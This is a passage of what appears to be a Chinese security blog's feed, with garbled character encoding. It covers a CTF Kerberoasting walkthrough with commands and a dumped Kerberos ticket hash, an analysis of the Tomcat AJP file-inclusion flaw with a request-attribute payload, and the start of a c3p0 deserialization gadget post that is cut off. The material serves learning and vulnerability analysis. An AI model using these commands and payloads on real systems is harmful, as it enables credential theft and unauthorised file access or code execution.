class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -s http&#x2F;DM.De1CTF2020.lab De1CTF2020\De1ta</span><br></pre></td></tr></table></figure><p><img src="1588585758205-e69fc027-0b02-4e6f-b516-8785fa075439.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&name=image.png&originHeight=344&originWidth=1426&size=63731&status=done&style=none&width=713" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure><p><img src="1588585820496-1b01ef87-4f61-424c-a363-3a1e47de1be5.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1226&size=83062&status=done&style=none&width=746" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;Empire&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1</span><br><span class="line">powershell Invoke-Kerberoast</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">TicketByteHexStream  : </span><br><span class="line">Hash                 : $krb5tgs$http&#x2F;DM.De1CTF2020.lab:0B5E0028717C31BF16F95DDF</span><br><span class="line">                       CA441A51$A71E43FD37E2E10E3029FE2767B0266CCABE13F68B27A46</span><br><span class="line">                       955A440DA3F3B4AF1D4C7A8C357B69655364C27DA73C80FBE9075A94</span><br><span class="line">                       615EB720E7A3E1E8610A1C18962338E87479D0A17D902B904B4DE4B5</span><br><span class="line">                       AD3BAE015D3709899570BD6D25392C9E98345535523CCBE65125B0E7</span><br><span class="line">                       1F2482040F2347DD13B7062B8A9E6DAA5C79F2843A2F030BBA0DCA91</span><br><span class="line">                       8FFEEE32D61BCAF4453315AAED98A427CF843C71EDB3EFBD2F47EF83</span><br><span class="line">                       9229E51A6A10A9D180B6EAF698B9C5D446F61BCA21E59413EC380A3F</span><br><span class="line">                       426F941EA42704B7262812E44FA1F04F05DAFF0E06B5690538D3BB8B</span><br><span class="line">                       10263FE97E05D6FE9F9E5BF1EFFF6A0344FA8F8B20CC0AA39BF95538</span><br><span class="line">                       4C3B543BF9B9A4E23C8F071D24E846F284A6FE62278E76ED47897FB2</span><br><span class="line">                       3264CC57A7EDE8C613EAD87914C511F2554AAEA6F663E66B8BA0760C</span><br><span class="line">                       296F82253303A5FF2DF5F8343AD2097F57B376BF83C302D806D620B9</span><br><span class="line">                       8ED2D3C53DF65AE37A7D6356EFC1A9123CCF56549A5288C132E3F5D0</span><br><span class="line">                       5A066CE50FFCB654BF79FD5F673175F9AD98C1140E8B50D0F574080A</span><br><span class="line">                       48EADBFBB00668B96A79F95E429CC42B4BD3CA2C9A106CD6D39312D9</span><br><span class="line">                       BD13B4452861E47DD71F36D3DAD4A570480D56BDEF1F278518219FA2</span><br><span class="line">                       5D076758B994C5F4EC8CF49C85DA1CFFAC91DF63AB5D71EF5135CD36</span><br><span class="line">                       D54FCB9C2A9EF61D67A3BC01EF668F255A66487F3493BE0F8352EAFF</span><br><span class="line">                       A009D561BE459F1130C6A3AF81060FD82232B3E430A196C5580FBDBB</span><br><span class="line">                       3EEAC6AA6FD2774063CB16C1CB161B20CD6ED3BF414349DECCCF8753</span><br><span class="line">                       9CE1EEBC28DD27DCE32752640F22817286211841DE22191300D75970</span><br><span class="line">                       D721021FA1211FA368A14EACEBABA5B42B1F3B087CE04782A695F046</span><br><span class="line">                       1CCCDC1445DE56D31582825E2824E47499C91A396D867A4284C4DD40</span><br><span class="line">                       AD1E1AF7A2073729FCB66A52C076A7F3515C93F54189CBDAAF408838</span><br><span class="line">                       736CA682CFF82CBA4DBFF757CD297CC16FF0A8F6F7C9F206ACB5BB87</span><br><span class="line">                       61C54AD1635572C16E6FC01B40E6F84F71153514EA21A87B28358A38</span><br><span class="line">                       4B3ECA5206F35EE3732DADE97726E07E8FEBE3D7EE3A77A2A4EEE1BE</span><br><span class="line">                       59F4EC5336E4F65D2A4F111C79A73D24F9BDFCCBEAEAC5768538EFAD</span><br><span class="line">                       00A191BB7941DF4A441BB83D061D42CB59D03A61921117DB835AA1D0</span><br><span class="line">                       DEB00AD6BC4A694CC39A465CF23447D7CDB1F19EBFCB92C555E75CE6</span><br><span class="line">                       7999B76A4FE22D1D34AF706A1505DC027D8BDC8A0055095605255BB8</span><br><span class="line">                       F437551248B77A559463C39934A6A95F183DD1FF5C4152949C0B6F69</span><br><span class="line">                       6C4B6A649A4B207CE4202B8884F54C1BC9ECA86F966EF2B86F3A89D3</span><br><span class="line">                       1E07C880C5E5DBCD35338FB485A46E74779D45BF38E2398A16377C15</span><br><span class="line">                       43E32DACFF71713DBF7288640AA751FC5A51B8DF873BBEB1F946331C</span><br><span class="line">                       CF59E6FC4209322D9BCAB8C51F5B408545BA9C4DA11755B4477DF968</span><br><span class="line">                       90F72E86D900D78BE6006BD14E1380725D1D8</span><br><span class="line">SamAccountName       : De1ta</span><br><span class="line">DistinguishedName    : CN&#x3D;De1ta,CN&#x3D;Users,DC&#x3D;De1CTF2020,DC&#x3D;lab</span><br><span class="line">ServicePrincipalName : http&#x2F;DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 kerberos.txt cracks.txt</span><br></pre></td></tr></table></figure><p>psï¼šç”¨psä¹Ÿå¯ä»¥GetSPNUser</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;wintool&#x2F;kerberoast&#x2F;GetUserSPNs.ps1</span><br><span class="line">powershell GetUserSPNs</span><br></pre></td></tr></table></figure><p><img src="1588586928131-13925d80-d0b6-473b-9610-c1a4dc4fa2e2.png#align=left&display=inline&height=607&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1214&originWidth=3316&size=393681&status=done&style=none&width=1658" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      æŠŠä¸€äº›åœç•™åœ¨ç†è®ºè®¤çŸ¥ä¸Šçš„é«˜çº§æ”»å‡»å§¿åŠ¿å…¨éƒ¨æ“ç»ƒäº†ä¸€éï¼Œå­¦åˆ°å¾ˆå¤šã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="ctf" scheme="https://cl0und.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>tomcat ajp æ¼æ´åˆ†æ</title>
    <link href="https://cl0und.github.io/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cl0und.github.io/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-26T13:25:37.000Z</published>
    <updated>2020-07-11T08:20:03.227Z</updated>
    
    <content type="html"><![CDATA[<!-- æ¼æ´åŸç†æœ¬èº«å¾ˆç®€å•ï¼Œå€¼å¾—å­¦ä¹ çš„æ˜¯tomcatè¿è¡Œçš„å®è§‚æµç¨‹ï¼Œå€¼å¾—æ€è€ƒçš„æ˜¯é•¿äº­çš„å¸ˆå‚…æ˜¯æ€ä¹ˆæŒ–åˆ°çš„ã€‚ --><!-- more --><h2 id="ä»€ä¹ˆæ˜¯ajp"><a href="#ä»€ä¹ˆæ˜¯ajp" class="headerlink" title="ä»€ä¹ˆæ˜¯ajp"></a>ä»€ä¹ˆæ˜¯ajp</h2><p>ç®€å•ç†è§£æˆhttpçš„äºŒè¿›åˆ¶ä¼˜åŒ–ç‰ˆã€‚<br><img src="1586848883054-0b35011f-8666-4ece-b2ab-91515b6858d2.png#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&name=image.png&originHeight=300&originWidth=699&size=65236&status=done&style=none&width=746" alt="image.png"></p><h2 id="tomcatç»“æ„"><a href="#tomcatç»“æ„" class="headerlink" title="tomcatç»“æ„"></a>tomcatç»“æ„</h2><p>åœ¨Containeréƒ¨åˆ†ï¼Œä¸€ä¸ªHostä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªContextä»£ç ä¸€å¥—webç¨‹åºï¼Œä¸€ä¸ªWrapperä»£è¡¨ä¸€ä¸ªserlvletã€‚ä¸€ä¸ªtomcatå¯ä»¥æœ‰å¤šä¸ªHostï¼Œä¸€ä¸ªHostå¯ä»¥æœ‰å¤šä¸ªContextï¼Œä¸€ä¸ªContextå¾€å¾€æœ‰å¤šä¸ªWrapperã€‚<br><img src="1586848550182-49e7237d-f5f0-41ec-8fd0-8d3d2812569e.png#align=left&display=inline&height=564&margin=%5Bobject%20Object%5D&name=image.png&originHeight=705&originWidth=933&size=197577&status=done&style=none&width=746" alt="image.png"></p><p>åœ¨Conectoréƒ¨åˆ†Endpointçš„Acceptorç›‘å¬è¿æ¥ï¼ŒHandlerç”¨äºå¤„ç†æ¥æ”¶åˆ°çš„Socketï¼Œåœ¨å†…éƒ¨è°ƒç”¨Processorè¿›è¡Œå¤„ç†ã€‚processoræŠŠä¿¡æ¯è¯»å–å‡ºæ¥å¹¶è®¾ç½®è¿›requestä¸­å¯¹è±¡æœ€åäº¤ç»™Adaptorï¼ŒAdapterå°†è¯·æ±‚é€‚é…åˆ°Servletå®¹å™¨è¿›è¡Œå…·ä½“çš„å¤„ç†ã€‚<br><img src="1586848576204-d9c37880-c814-47ec-be54-a306d6189fa5.png#align=left&display=inline&height=325&margin=%5Bobject%20Object%5D&name=image.png&originHeight=457&originWidth=1050&size=78935&status=done&style=none&width=746" alt="image.png"></p><h2 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h2><p>tomcat 7.0.96</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"> Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment">  contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment">  this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment">  (the "License"); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment">  the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">                      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">"3.0"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">metadata-complete</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Welcome to Tomcat<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">     Welcome to Tomcat</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="ä»£ç æµç¨‹è·Ÿè¸ª"><a href="#ä»£ç æµç¨‹è·Ÿè¸ª" class="headerlink" title="ä»£ç æµç¨‹è·Ÿè¸ª"></a>ä»£ç æµç¨‹è·Ÿè¸ª</h2><p>ä»£ç è·Ÿè¸ªä»handlerè°ƒç”¨processorçš„processå¼€å§‹ã€‚<br><img src="1586853383398-98ae9333-1d19-4dc9-86fa-9b912bc79233.png#align=left&display=inline&height=473&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1758&originWidth=2770&size=598418&status=done&style=none&width=746" alt="image.png"><br>processé‡Œé¢æœ‰ä¸¤éƒ¨å¾ˆé‡è¦ä¸€ä¸ªæ˜¯prepareRequestï¼Œå¦ä¸€ä¸ªæ˜¯this.adapter.serviceã€‚<img src="1586863715345-6ad632aa-82f6-421e-a9f3-a2af6b8cb53c.png#align=left&display=inline&height=448&margin=%5Bobject%20Object%5D&name=image.png&originHeight=896&originWidth=2356&size=258201&status=done&style=none&width=1178" alt="image.png"></p><h3 id="prepareRequest"><a href="#prepareRequest" class="headerlink" title="prepareRequest"></a>prepareRequest</h3><p>å…ˆæ¥çœ‹prepareRequestã€‚é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æŠŠajpçš„äºŒè¿›åˆ¶ç‰ˆçš„httpæ•°æ®è¯»å–ï¼ˆè¯·æ±‚æ–¹æ³•ï¼Œè¯·æ±‚è·¯å¾„ï¼Œhttpå¤´ç­‰ä¿¡æ¯ï¼Œä¸æ¯å¤„éƒ½æˆªå›¾äº†ï¼‰å¹¶è®¾ç½®è¿›requestå¯¹è±¡ï¼Œç„¶åè®¾ç½®ä¸€äº›å¯¹headerå’Œcookiesé•¿åº¦æˆ–æ•°é‡åšä¸€äº›é™åˆ¶ã€‚<br><img src="1586864450769-bb69818d-8d74-44e7-ae48-bf781e2d6104.png#align=left&display=inline&height=469&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1996&size=261734&status=done&style=none&width=998" alt="image.png"><br>æ¥ä¸‹æ¥ä¼šè¯»å–ä¸€ä¸ªå«attributeCodeçš„ä¸œè¥¿ï¼Œpayloadæœ‰æ„æŠŠå®ƒè®¾ç½®æˆäº†10ã€‚è¿™æ ·ä»–ä¼šæŠŠæˆ‘ä»¬åœ¨payloadä¸­æ„é€ çš„attributesè®¾ç½®è¿›requestå¯¹è±¡çš„attributeï¼Œåé¢ä»»æ„è¯»æ–‡ä»¶æˆ–è€…åŒ…å«ç¥¸èµ·å°±æ˜¯ä»è¿™é‡Œå¼€å§‹çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">"/WEB-INF/web.xml"</span></span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, file_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="1586864883149-eb93af17-dd1e-4e89-9559-14f8929b7952.png#align=left&display=inline&height=345&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=2204&size=205872&status=done&style=none&width=1102" alt="image.png"></p><h3 id="adapter-service"><a href="#adapter-service" class="headerlink" title="adapter.service"></a>adapter.service</h3><p>åœ¨adapter.serviceä¸­ä¼šåœ¨postParseRequestä¸­å¯¹urlè¿›è¡Œå¤„ç†åŠåˆæ³•æ€§æ£€æŸ¥ï¼ˆè¿™é‡Œé¢å¯èƒ½æ¶‰åŠåˆ°å¯¹urlæƒé™æ ¡éªŒçš„é—®é¢˜ä»¥åæœ‰æœºä¼šå†èŠï¼‰ã€‚å¦‚æœåˆæ³•çš„ä¼šè¿›å…¥ä¸‹é¢çš„invokeã€‚<br><img src="1586865838743-26dc4c06-7ea3-46d2-9cb9-2f36aedfafe5.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&name=image.png&originHeight=356&originWidth=2738&size=149846&status=done&style=none&width=1369" alt="image.png"></p><p>è·Ÿè¿›invokeåä¼šå‘ç°æ˜¯ä¸€è¿ä¸²ç–¯ç‹‚çš„invokeï¼Œè¿™é‡Œå–å‡ ä¸ªæœ‰ä»£è¡¨æ€§çš„æˆªå›¾<br>StandardEngineValve invoke<br><img src="1586923179322-45d6b282-158d-4eaf-9dfb-5004711c2893.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1124&originWidth=2454&size=310682&status=done&style=none&width=746" alt="image.png"><br>StandardHostValve invoke<br><img src="1586923274206-c60e2df8-166c-4b35-9f38-82b3551ec6fc.png#align=left&display=inline&height=798&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1596&originWidth=2724&size=515506&status=done&style=none&width=1362" alt="image.png"><br>StandardContextValve invoke<br><img src="1586923319531-6fa17c23-a6aa-41f8-a647-dd67f73ded50.png#align=left&display=inline&height=791&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1582&originWidth=2626&size=464917&status=done&style=none&width=1313" alt="image.png"><br>æœ€åè¿›å…¥StandardWrapperValveçš„invoke<br>wrapper.allocateä¼šè¿”å›è¿™æ¬¡è¯·æ±‚å¯¹åº”çš„servletï¼Œå› ä¸ºæˆ‘ä»¬è®¿é—®è·¯å¾„æ˜¯/ï¼Œæ‰€ä»¥é»˜è®¤å¯¹åº”index.jspï¼Œæ‰€ä»¥ç”±jspServletæ¥å¤„ç†ã€‚<br><img src="1586923891934-b3956df4-f6f8-43eb-89a2-2efb12440777.png#align=left&display=inline&height=543&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1676&originWidth=2304&size=460267&status=done&style=none&width=746" alt="image.png"><br>æ¥ä¸‹æ¥è¿›å…¥è¿‡æ»¤å™¨é“¾<br><img src="1586931342555-5573ca98-21b6-41ea-abbb-9356e6503285.png#align=left&display=inline&height=323&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1078&originWidth=2486&size=327697&status=done&style=none&width=746" alt="image.png"><br>doFilterå†…éƒ¨è°ƒç”¨internalDoFilter<br><img src="1586950100578-c1b80b6c-7907-432f-92e4-94e9922ec789.png#align=left&display=inline&height=658&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1316&originWidth=2532&size=291640&status=done&style=none&width=1266" alt="image.png"><br>åœ¨internalDoFilterä¸­ä¼šéå†æ‰€æœ‰æ³¨å†Œè¿‡çš„filterç„¶åè¿›è¡Œè¿‡æ»¤ã€‚éå†å®Œæˆåä¼šè°ƒç”¨å¯¹åº”servletçš„servicesæ–¹æ³•ã€‚<br><img src="1586950744560-48b72337-e4aa-448a-ac97-4fed3e26894e.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=image.png&originHeight=442&originWidth=2248&size=110370&status=done&style=none&width=1124" alt="image.png"><br><img src="1586951186394-890844d7-b6a7-466b-804b-ea89313f8f6a.png#align=left&display=inline&height=665&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1330&originWidth=2734&size=376224&status=done&style=none&width=1367" alt="image.png"><br>è¿™é‡Œä¼šæŠŠpayloadä¸­çš„ javax.servlet.include.request_uri javax.servlet.include.path_infoæå–å¹¶æ‹¼æ¥åˆ°ä¸€èµ·å½¢æˆjspUriã€‚<br><img src="1586960289652-da60cd10-c25c-4414-88e4-9368fc30f9fe.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=2702&size=334635&status=done&style=none&width=1351" alt="image.png"><br>è¿™é‡ŒjspUriä¼šè¢«ä¼ å…¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œä¼ å…¥çš„æ˜¯jspï¼Œtomcatä¼šæŠŠjspè½¬ä¸ºservletï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯æ˜¯éjspæ–‡ä»¶ä¸ç¬¦åˆè¯­æ³•æ‰€ä»¥è¿™éƒ¨åˆ†åŸæ ·è¾“å‡ºã€‚å› æ­¤å¦ä¸€ç§ä½¿ç”¨æ–¹æ³•ä¹Ÿå‘¼ä¹‹æ¬²å‡ºï¼Œå¦‚æœæœ‰ä¸€ä¸ªä¸Šä¼ æ´å¯ä»¥æŠŠæ–‡ä»¶ä¸Šä¼ åˆ°webappç›®å½•ä¸‹(ä¸ç®¡ä»€ä¹ˆåç¼€ï¼‰é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åŒ…å«è¿™ä¸ªæ–‡ä»¶è¾¾åˆ°rceæ•ˆæœï¼ˆå’Œphpå¾ˆåƒï¼‰ã€‚<br><img src="1586960624486-d7fff066-76db-4488-8574-0225b80ab005.png#align=left&display=inline&height=563&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1126&originWidth=1994&size=216493&status=done&style=none&width=997" alt="image.png"><br><img src="1586961002526-9f14dac1-fb1f-4c34-8d11-c81d79c5f330.png#align=left&display=inline&height=323&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=2736&size=192472&status=done&style=none&width=1368" alt="image.png"><br><img src="1586961828973-04fb72ff-63d4-4c35-802e-8f9fafd30083.png#align=left&display=inline&height=520&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1040&originWidth=2620&size=348008&status=done&style=none&width=1310" alt="image.png"></p><p>è¡¥å……ï¼Œåªèƒ½åŒ…å«webappä¸‹é¢çš„ä¸œè¥¿ã€‚åœ¨è¯»å–ä¹‹å‰ä¼šå¯¹ä¼ å…¥çš„è·¯å¾„è¿›è¡Œæ ¼å¼åŒ–ï¼Œå¹¶åœ¨æ ¼å¼åŒ–åå¼ºåˆ¶åŠ /ï¼Œæ— æ³•../è·³å‡ºã€‚<br><img src="1586962499263-2e94b420-3934-43ba-9b82-2f845a5e7f6f.png#align=left&display=inline&height=383&margin=%5Bobject%20Object%5D&name=image.png&originHeight=766&originWidth=2320&size=231720&status=done&style=none&width=1160" alt="image.png"></p><h2 id="ä»£ç æµç¨‹è·Ÿè¸ªå›¾"><a href="#ä»£ç æµç¨‹è·Ÿè¸ªå›¾" class="headerlink" title="ä»£ç æµç¨‹è·Ÿè¸ªå›¾"></a>ä»£ç æµç¨‹è·Ÿè¸ªå›¾</h2><p><img src="1586849002838-3c230310-b346-46ad-b5e0-e636797563c6.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=942&size=83164&status=done&style=none&width=746" alt="image.png"></p><h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>æ–‡ä¸­åˆ†æçš„æ˜¯æœ€ç†æƒ³çš„æƒ…å†µå®é™…åˆ©ç”¨ä¼šå—åˆ°è¿‡æ»¤å™¨æˆ–æ˜¯æ¡†æ¶çš„å½±å“å…³äºè¿™éƒ¨åˆ†å†…å®¹å¯ä»¥çœ‹<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/">å¦‚ä½•æ›´åŠ ç²¾ç¡®çš„æ£€æµ‹Tomcat AJPæ–‡ä»¶åŒ…å«æ¼æ´(CVE-2020-1938)</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/7325">Tomcat Ajpåè®®æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ</a><br><a href="https://xz.aliyun.com/t/7510">tomcatå¹½çµçŒ«åˆ†æ</a></p>]]></content>
    
    <summary type="html">
    
      æ¼æ´åŸç†æœ¬èº«å¾ˆç®€å•ï¼Œå€¼å¾—å­¦ä¹ çš„æ˜¯tomcatè¿è¡Œçš„å®è§‚æµç¨‹ï¼Œå€¼å¾—æ€è€ƒçš„æ˜¯é•¿äº­çš„å¸ˆå‚…æ˜¯æ€ä¹ˆæŒ–åˆ°çš„ã€‚
    
    </summary>
    
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>c3p0çš„ä¸‰ä¸ªgadget</title>
    <link href="https://cl0und.github.io/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/"/>
    <id>https://cl0und.github.io/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/</id>
    <published>2020-04-18T03:14:34.000Z</published>
    <updated>2020-07-11T07:59:46.984Z</updated>
    
    <content type="html"><![CDATA[<!-- é™¤äº†å¸¸è§çš„http baseä¹‹å¤–ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹c3p0å¯ä»¥ä½¿ç”¨jndiå’Œhexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨æ¥è¿›è¡Œrceã€‚ --><!-- more --><p>c3p0æœ‰ä¸‰ç§æ–¹å¼getshell</p><ul><li>http base</li><li>jndi</li><li>hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨</li></ul><p>http baseé€‚ç”¨äºåŸç”Ÿååºåˆ—åŒ–ï¼Œåé¢ä¸¤ç§é€‚ç”¨äºå…¶ä»–è§£ç»„ç±»å‹çš„ååºåˆ—åŒ–ã€‚å…·ä½“æ¥è®²ï¼Œjndié€‚ç”¨äºjdk8u191ä»¥ä¸‹æ”¯æŒreferenceæƒ…å†µï¼Œhexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨é€‚ç”¨äºä¸å‡ºç½‘ä½†æ˜¯ç›®æ ‡ä¾èµ–æœ‰gadgeté“¾çš„æƒ…å†µã€‚</p><h2 id="http-base"><a href="#http-base" class="headerlink" title="http base"></a>http base</h2><p>c3p0 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 